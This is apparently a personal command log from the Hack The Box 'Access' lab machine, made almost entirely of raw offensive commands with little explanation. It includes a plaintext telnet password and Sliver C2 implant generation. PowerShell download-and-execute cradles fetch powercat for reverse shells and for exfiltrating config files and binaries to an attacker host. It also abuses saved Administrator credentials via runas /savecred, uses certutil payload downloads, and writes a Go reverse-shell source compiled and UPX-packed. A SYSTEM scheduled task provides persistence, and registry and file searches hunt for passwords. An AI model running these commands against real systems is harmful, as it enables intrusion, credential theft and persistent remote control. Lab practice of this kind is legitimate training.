# Access CMD-by-CMDs

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```


```bash
# extract .pst
thunar # unzip gui as unzip considers it a weird commpression type 
# Run script to dump all tables from database
# It is quit slow - beware 
telnet 10.10.10.98
security
4Cc3ssC0ntr0ller
# pick a shell - no powershell initially
# Sliver 
sliver
# Create  a listens 
mtls -L 10.10.14.16 -l 8888
mtls -L 10.10.14.16 -l 8889
# Generate a session and beacon implants
generate --mtls 10.10.14.16:8888 --arch amd64 --os windows --save /home/kali/Access-data
generate beacon --mtls 10.10.14.16:8889 --arch amd64 --os windows --save /home/kali/Access-data

# Simple, but is reliant on telnet connection
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8840 -e cmd"
# Exfiltrate with powercat in memory
# Kali 
#nc -lvnp 8000 > ZKAccess3.5/.. - Access.exe
nc -lvnp 8000 > yawcam_settings.xml
nc -lvnp 8000 > web.config
# target 

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\Users\security\.yawcam\yawcam_settings.xml"

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\ZKTeco\ZKAccess3.5\Access.exe"




# Start SMB share
# No password as we dont have powershell
impacket-smbserver Share $(pwd) -smb2support

cmdkey /list
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\GIGANTIC_SCREEN.exe"
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\RIGID_NANOPARTICLE.exe"


certutil.exe -urlcache -split -f http://10.10.14.16/shell.exe shell.exe
runas /savecred /user:ACCESS\Administrator "C:\temp\shell.exe"

# Goodbye group policy 


# Cleanup 
del C:\GIGANTIC_SCREEN.exe
del C:\RIGID_NANOPARTICLE.exe
schtasks /end /tn giganticscreen
```


Priv Esc with Hacktricks
```powershell
tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running"

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

findstr /si password *.xml *.ini *.txt *.config

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
# Beware alot of output!:
REG QUERY HKCU /F "password" /t REG_SZ /S /d
REG QUERY HKLM /F "password" /t REG_SZ /S /d 
# Other credentials
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"

cd C:\


cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "\\10.10.14.16\Share\GIGANTIC_SCREEN.exe"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.14.16\Share\RIGID_NANOPARTICLE.exe"

sc query state=all

```

GPO tears cmds
```powershell
# This unnessary, but was done once 
cd C:\temp
certutil.exe -urlcache -split -f http://10.10.14.16/Share/GIGANTIC_SCREEN.exe GIGANTIC_SCREEN.exe
certutil.exe -urlcache -split -f http://10.10.14.16/Share/RIGID_NANOPARTICLE.exe RIGID_NANOPARTICLE.exe 

# Not even in memory 
powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.16/wp.bat','c:\temp\wp.bat')"

# Cry about the group policy 
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.16:8843");cmd:=exec.Command("cmd");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > shell.go
# Compile, strip binary and pack
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o shell shell.go 
upx shell
# size of 730624  
# Cry because it not allowing non .\mango
certutil.exe -urlcache -split -f http://10.10.14.16/shell mango


# Schedule task the session just in case
schtasks /create /sc minute /mo 1 /tn "giganticscreen" /tr C:\temp\GIGANTIC_SCREEN.exe /ru "SYSTEM"
# This will be block by group policy, but for beyond root 
```